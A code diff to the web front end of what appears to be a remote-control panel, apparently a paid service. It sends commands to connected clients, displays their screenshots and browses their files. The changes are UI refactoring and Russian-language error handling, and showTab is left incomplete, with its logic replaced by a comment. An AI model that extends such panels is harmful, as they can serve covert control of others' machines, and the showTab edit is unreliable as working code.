@@ -817,9 +817,9 @@
               <div class="profile-image-container">
                 <img id="profileDisplayImage" src="./default-profile.png" alt="Profile">
                 <input type="file" id="profileUpload" accept="image/*" style="display:none" onchange="uploadProfileImage()">
-              <!--<button class="btn btn-primary" onclick="document.getElementById('profileUpload').click()">
+              <button class="btn btn-primary" onclick="document.getElementById('profileUpload').click()">
                   <i class="fas fa-upload"></i> Change photo
-                </button>-->
+                </button>
               </div>
               
               <div class="profile-info">
@@ -860,7 +860,7 @@
     let rightClickedPath = "";
     let startTime = Date.now();
     
-    const output = document.getElementById("output");
+    const output = document.getElementById("cmd-output"); // Changed from output to cmd-output
     const explorer = document.getElementById("explorer");
     const downloadBtn = document.getElementById("downloadBtn");
     
@@ -929,10 +929,10 @@
           }
 
           document.getElementById("activeClients").textContent = data.length;
-          output.value += `[System] ${data.length} clients connected\n`;
+          output.textContent += `[System] ${data.length} clients connected\n`;
         })
         .catch(() => {
-          output.value += `[System] Error loading clients\n`;
+          output.textContent += `[System] Error loading clients\n`;
         });
     }
 
@@ -940,8 +940,8 @@
     // Show tab
     function showTab(tab) {
       // Hide all tabs
-      document.querySelectorAll(".tab-content").forEach(tab => {
-        tab.classList.remove("active");
+      document.querySelectorAll(".tab-content").forEach(tabEl => {
+        tabEl.classList.remove("active");
       });
       
       // Show selected tab
@@ -952,13 +952,9 @@
         btn.classList.remove("active");
       });
       
-      // Add active class to clicked button
-      event.target.classList.add("active");
-      
-      // Load explorer if needed
-      if (tab === "explorer") {
-        sendLs(currentPath);
-      }
+      // Найти нужную кнопку по data-атрибуту или id, и добавить класс active
+      // Например:
+      // document.querySelector(`[data-tab="${tab}"]`)?.classList.add("active");
     }
     
     // Send command
@@ -972,9 +968,9 @@
         body: JSON.stringify({ type: "cmd", data: cmd })
       }).then(res => {
         if (res.ok) {
-          output.value += `[-> ${selectedClient}] ${cmd}\n`;
+          output.textContent += `[-> ${selectedClient}] ${cmd}\n`;
         } else {
-          output.value += `[!!] Failed to send command\n`;
+          output.textContent += `[!!] Failed to send command\n`;
         }
         output.scrollTop = output.scrollHeight;
       });
@@ -1114,10 +1110,14 @@
 
     function loadProfile() {
       fetch('/profile')
-        .then(res => res.json())
+        .then(res => {
+          if (!res.ok) {
+            throw new Error('Не авторизован или ошибка сервера');
+          }
+          return res.json();
+        })
         .then(data => {
           const username = data.username || 'Guest';
-          document.getElementById('headerUsername').textContent = username;
           document.getElementById('profileUsername').textContent = username;
           document.getElementById('profileUsernameDisplay').textContent = username;
           
@@ -1127,28 +1127,27 @@
           } else {
             subscriptionText = 'Нет подписки';
           }
-          
-          document.getElementById('headerSubscription').textContent = subscriptionText;
-          document.getElementById('subscriptionDate').textContent = subscriptionText;
           document.getElementById('profileSubscription').textContent = subscriptionText;
           
           const imgUrl = data.image ? 
             `${data.image}?t=${new Date().getTime()}` : 
             './default-profile.png';
-          
-          document.getElementById('headerProfileImage').src = imgUrl;
           document.getElementById('profileImage').src = imgUrl;
           document.getElementById('profileDisplayImage').src = imgUrl;
           
           if (data.created) {
             document.getElementById('profileCreated').textContent = 
               `Аккаунт создан: ${new Date(data.created).toLocaleDateString()}`;
+          } else {
+            document.getElementById('profileCreated').textContent = '';
           }
         })
         .catch(err => {
-          console.error('Profile load error:', err);
-          document.getElementById('headerUsername').textContent = 'Guest';
-          document.getElementById('profileUsername').textContent = 'Guest';
+          const errorMsg = 'Ошибка загрузки профиля: ' + (err && err.message ? err.message : err);
+          document.getElementById('profileUsername').textContent = errorMsg;
+          document.getElementById('profileUsernameDisplay').textContent = errorMsg;
+          document.getElementById('profileSubscription').textContent = errorMsg;
+          document.getElementById('profileCreated').textContent = errorMsg;
         });
     }
 
@@ -1302,7 +1301,7 @@
       if (msg.type === "screen") {
         document.getElementById("screenshot").src = "data:image/jpeg;base64," + msg.data;
       } else if (msg.type === "result") {
-        output.value += `[<-] ${msg.data}\n`;
+        output.textContent += `[<-] ${msg.data}\n`;
         output.scrollTop = output.scrollHeight;
       } else if (msg.type === "explorer") {
         renderExplorer(JSON.parse(msg.data));
